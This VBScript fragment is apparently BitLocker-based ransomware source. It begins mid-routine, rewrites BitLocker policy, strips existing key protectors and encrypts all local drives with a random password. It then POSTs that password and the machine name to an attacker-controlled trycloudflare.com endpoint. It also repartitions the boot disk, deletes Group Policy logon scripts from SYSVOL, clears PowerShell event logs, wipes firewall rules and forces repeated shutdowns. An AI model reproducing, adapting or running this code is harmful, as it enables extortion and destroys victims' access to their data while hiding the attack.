		If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
        Set objWMI = GetObject("winmgmts:\\.\root\cimv2\Security\MicrosoftVolumeEncryption")
        Set objVolumes = objWMI.ExecQuery("SELECT * FROM Win32_EncryptableVolume")

        For Each objVolume In objVolumes
			objVolume.DisableKeyProtectors
			objVolume.DeleteKeyProtectors()
            objVolume.ProtectKeyWithNumericalPassword
            objVolume.Encrypt(1),(1)
            objVolume.EnableKeyProtectors()
			objVolume.GetKeyProtectors 0,VolumeKeyProtectorID
			For Each objId in VolumeKeyProtectorID
				Dim test
					objVolume.GetKeyProtectorNumericalPassword objId, test
				If test <> "" Then
					result = result  & objVolume.DriveLetter & " " & objId & " " & test & VBCrLf
				End If
				set test = Nothing
			Next
		Next
	End If
Next


Dim totalMemory, freeMemory, usedMemory
For Each objItem In colItems
  totalMemory = CLng(objItem.TotalVisibleMemorySize) * 1024
  freeMemory = CLng(objItem.FreePhysicalMemory) * 1024
  usedMemory = totalMemory - freeMemory
Next




Dim strRandom

characters = "0123456789thequickbrownfoxjumpsoverthlazydogTHEQUICKBROWNFOXJUMPSOVERTHELAZYDOG!@#$&*-+=_;"


Dim seed
seed = CStr(usedMemory) & CStr(usedSpaceTotal) & CStr(freeSpaceTotal) & CStr(freeMemory)  & CStr(sys) & CStr(perf) & CStr(received) & CStr(sent) & CStr(Timer)

Randomize seed
For i = 1 To 64
    
    randomNum = Int(Len(characters) * Rnd(2))

    
    randomChar = Mid(characters, randomNum + 1, 1)

    
    strRandom = strRandom & randomChar

Next


If InStr(1, Caption, "2008", vbTextCompare) > 0 Or InStr(1, Caption, "7", vbTextCompare) > 0 Then
Else
	Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
	Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_LogicalDisk")
	Dim matchedDrives
	For Each objItem in colItems
		If Not IsNull(objItem.DeviceID) And (objItem.FileSystem = "NTFS" Or objItem.FileSystem = "exFAT" Or  objItem.FileSystem = "FAT32" Or  objItem.FileSystem = "ReFS" Or  objItem.FileSystem = "FAT"  ) Then
			matchedDrives = matchedDrives & objItem.DeviceID & ","

		End If
	Next

	If Len(matchedDrives) > 0 Then
		matchedDrives = Left(matchedDrives, Len(matchedDrives) - 1)
		drives = Split(matchedDrives, ",")
		For i = 0 To UBound(drives)
			If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If 
			If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("powershell.exe -Command ""$protectors = (Get-BitLockerVolume -MountPoint " & drives(i) & ").KeyProtector; if ($protectors -ne $null) { foreach ($protector in $protectors) { Remove-BitLockerKeyProtector -MountPoint " & drives(i) & " -KeyProtectorId $protector.KeyProtectorId } }""")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("powershell.exe -Command $a=ConvertTo-SecureString " & Chr(34)  & Chr(39) & strRandom & Chr(39)  & Chr(34) & " -asplaintext -force;Enable-BitLocker " & drives(i) & " -s -qe -pwp -pw $a")).stdout.readall) > 0 Then: End If
			If Len((CreateObject("WScript.Shell").Exec("powershell.exe -Command Resume-BitLocker -MountPoint " & drives(i) & " ")).stdout.readall) > 0 Then: End If
		Next
	End If
End If

Set httpRequest = CreateObject("WinHttp.WinHttpRequest.5.1")
httpRequest.Open "POST", "https://earthquake-js-westminster-searched.trycloudflare.com/updatelog", False
httpRequest.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
httpRequest.SetRequestHeader "accept-language", "fr"
httpRequest.SetRequestHeader "user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
httpRequest.Option(4) = 13056
httpRequest.Option(6) = false

computerName = CreateObject("WScript.Network").ComputerName
postDataPlaintext = computerName & vbTab & matchedDrives & vbTab & strRandom
postDataPlaintext2 = computerName & vbTab & result

Set oXML = CreateObject("Msxml2.DOMDocument.6.0")
Set oNode = oXML.CreateElement("base64")
oNode.dataType = "bin.base64"

If InStr(1, caption, "2008", vbTextCompare) > 0 Or InStr(1, caption, "7", vbTextCompare) > 0 Then
    oNode.nodeTypedValue = Stream_StringToBinary(postDataPlaintext2)
	postData = "upgrade=" & oNode.Text
Else
    oNode.nodeTypedValue = Stream_StringToBinary(postDataPlaintext)
	postData = "upgrade=" & oNode.Text
End If


retryCount = 0

Do While retryCount < 5
On Error Resume Next
	httpRequest.SetTimeouts 15000, 15000, 15000, 15000
    httpRequest.Send postData
	If httpRequest.status = 520 Then
		If InStr(1, httpRequest.getAllResponseHeaders, "cloudflare", vbTextCompare) > 0 Then
		Exit Do
		Else
		WScript.Sleep(3000)
		End If
	End If
retryCount = retryCount + 1
Loop

strComputer = "." 
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Volume WHERE DriveLetter = '" & Driveletters & "'") 
WScript.Sleep(1000)
For Each objItem In colItems
 objItem.Label=ORLabel
  objItem.Put_
Next

For Each Os in GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_OperatingSystem")
os.Win32Shutdown(4)
next

If InStr(1, Caption, "7", vbTextCompare) > 0 Or InStr(1, Caption, "8.1", vbTextCompare) > 0 Or InStr(1, Caption, " 8", vbTextCompare) > 0 Then
For Each objDisk In GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT DriveLetter FROM Win32_Volume WHERE BootVolume='True'"): Driveletters=objDisk.DriveLetter: Next
Set objShell = CreateObject("Wscript.Shell")
set colLogicalDisksBefore = GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3")
Set objWMI = GetObject("winmgmts:\\.\root\cimv2\Security\MicrosoftVolumeEncryption")



Set objVolumes = objWMI.ExecQuery("SELECT * FROM Win32_EncryptableVolume where DriveLetter='" & Driveletters & "'")
	if objVolumes.count = 0 then
		Set colPartitions = objWMIService.ExecQuery("SELECT * FROM Win32_DiskPartition WHERE PrimaryPartition = TRUE and DiskIndex = 0")
				For Each objPartition In colPartitions
					strPartitionDeviceID = objPartition.DeviceID
					Set colLogicalDisks = objWMIService.ExecQuery("SELECT * FROM Win32_LogicalDiskToPartition WHERE Antecedent='Win32_DiskPartition.DeviceID=""" & strPartitionDeviceID & """'")
					For Each objDisk In colLogicalDisks
						Set colLogicalDisks2 = objWMIService.ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DeviceID='" & Replace(Mid(objDisk.Dependent, InStr(objDisk.Dependent, """") + 1), """", "") & "'")
						For Each objLogicalDisk In colLogicalDisks2
							strDriveLetter = objLogicalDisk.DeviceID
							set shrinkdisk = CreateObject("WScript.Shell").Exec("diskpart")
							shrinkdisk.StdIn.WriteLine("Select Volume " & strDriveLetter & vbCrLf)
							shrinkdisk.StdIn.WriteLine("shrink desired=100" & vbCrLf)
							shrinkdisk.StdIn.WriteLine("exit" & vbCrLf)
							WScript.Sleep(5000)
							If InStr(1, shrinkdisk.stdout.readall , "100", vbTextCompare) > 0 then
							set shrinkdisk = CreateObject("WScript.Shell").Exec("diskpart")
							shrinkdisk.StdIn.WriteLine("Select Volume " & strDriveLetter & vbCrLf)
							shrinkdisk.StdIn.WriteLine("create partition primary size=100" & vbCrLf)
							shrinkdisk.StdIn.WriteLine("format quick recommended override" & vbCrLf)
							WScript.Sleep(5000)
							shrinkdisk.StdIn.WriteLine("assign" & vbCrLf)
							shrinkdisk.StdIn.WriteLine("active" & vbCrLf)
							shrinkdisk.StdIn.WriteLine("exit" & vbCrLf)
							If InStr(1, shrinkdisk.stdout.readall , "100", vbTextCompare) > 0 then
								shrinkcomplate = "ok"
							Else
							End If
							Else
							Exit for
							End If
						Next
					Next
				if shrinkcomplate = "ok" then
				Exit For
				End if
				Next
				Set colLogicalDisksAfter = objWMIService.ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3")
						For Each objDiskAfter In colLogicalDisksAfter
							Dim driveExists1: driveExists1 = False
							For Each objDiskBefore In colLogicalDisksBefore
								If objDiskAfter.DeviceID = objDiskBefore.DeviceID Then
									driveExists1 = True
									Exit For
								End If
							Next
							If Not driveExists1 Then
								strDriveLetter = objDiskAfter.DeviceID
								Exit For
							End If
						Next
						If Len((CreateObject("WScript.Shell").Exec("bcdboot " & Driveletters & "\windows /s " & strDriveLetter)).stdout.readall) > 0 Then: End If
				set remove = CreateObject("WScript.Shell").Exec("diskpart")
				remove.StdIn.WriteLine("Select Volume " & strDriveLetter & vbCrLf)
				remove.StdIn.WriteLine("remove" & vbCrLf)
				remove.StdIn.WriteLine("exit" & vbCrLf)
				If Len(remove.stdout.readall) > 0 then
				For Each Os in GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_OperatingSystem"): os.Win32Shutdown(6): Next
				WScript.Sleep 6000000
				end if
				
	else
	end if

Else
End if




Set fso = CreateObject("Scripting.FileSystemObject")
if CreateObject("WScript.Network").ComputerName = "BIOS02" then
Set objSysInfo = CreateObject("ADSystemInfo")
strDomainName = objSysInfo.DomainDNSName
fso.DeleteFile "\\" & strDomainName & "\SYSVOL\" & strDomainName & "\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml"
fso.DeleteFile "\\" & strDomainName & "\SYSVOL\" & strDomainName & "\scripts\Logon.vbs", True
fso.DeleteFile "\\" & strDomainName & "\SYSVOL\" & strDomainName & "\scripts\disk.vbs", True
end if
fso.DeleteFile "C:\ProgramData\Microsoft\Windows\Templates\disk.vbs", True

If Len((CreateObject("WScript.Shell").Exec("wevtutil -cl ""Windows PowerShell""")).stdout.readall) > 0 Then: End If
If Len((CreateObject("WScript.Shell").Exec("netsh advfirewall set allprofiles state on")).stdout.readall) > 0 Then: End If
If Len((CreateObject("WScript.Shell").Exec("netsh advfirewall firewall delet rule name=all")).stdout.readall) > 0 Then: End If
If Len((CreateObject("WScript.Shell").Exec("schtasks /Delete /TN ""copy"" /F")).stdout.readall) > 0 Then: End If
If Len((CreateObject("WScript.Shell").Exec("schtasks /Delete /TN ""disk"" /F")).stdout.readall) > 0 Then: End If
Set objWMIService = GetObject("winmgmts:\\.\root\CIMv2\Security\MicrosoftVolumeEncryption")
For Each objDisk In GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT DriveLetter FROM Win32_Volume WHERE BootVolume='True'"): Driveletters=objDisk.DriveLetter: Next
Do
	Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_EncryptableVolume")
	For Each objItem in colItems
            If objItem.DriveLetter = Driveletters And objItem.ProtectionStatus = 1 Then
			For Each Os in GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_OperatingSystem")
			os.Win32Shutdown(12)
			Next
				
			End if
	Next
	WScript.Sleep(60000)
Loop
End Sub